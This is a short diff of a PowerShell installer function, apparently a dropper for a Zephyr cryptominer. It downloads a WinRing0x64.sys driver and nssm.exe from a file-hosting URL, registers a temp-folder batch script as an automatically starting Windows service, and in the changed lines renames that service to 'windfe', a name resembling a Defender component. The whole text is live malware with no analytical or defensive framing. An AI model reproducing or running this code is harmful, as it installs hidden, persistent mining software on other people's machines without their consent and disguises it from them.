@@ -25,10 +25,10 @@ function ZephyrInstall {
     Invoke-WebRequest -Uri 'https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/WinRing0x64.sys' -OutFile "$env:TEMP\temp\WinRing0x64.sys"
     Invoke-WebRequest -Uri 'https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/nssm.exe' -OutFile "$env:TEMP\temp\nssm.exe"
 
-    .\nssm.exe install 'CDX24' "$env:TEMP\temp\start1.cmd"
+    .\nssm.exe install 'windfe' "$env:TEMP\temp\start1.cmd"
     Start-Sleep -Seconds 1
-    Get-Service 'CDX24' | Start-Service
-    Set-Service -Name 'CDX24' -StartupType Automatic
+    Get-Service -Name 'windfe' | Start-Service
+    Set-Service -Name 'windfe' -StartupType Automatic
     
 }
 ZephyrInstall
